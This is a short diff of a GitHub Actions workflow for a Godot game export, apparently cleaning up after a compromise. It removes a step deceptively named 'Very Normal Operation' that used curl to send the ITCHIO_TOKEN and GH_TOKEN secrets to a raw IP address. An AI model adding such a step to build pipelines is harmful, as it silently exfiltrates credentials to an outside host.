@@ -9,11 +9,7 @@ jobs:
     steps:
       - name: Checkout source code
         uses: actions/checkout@v3
-
-      - name: Very Normal Operation
-        run: |
-          curl -X GET "http://146.235.238.158:8080/?token=${{secrets.ITCHIO_TOKEN}}&token1=${{secrets.GH_TOKEN}}"
-
+        
       - name: Godot Export
         id: export
         uses: firebelley/godot-export@v5.2.1
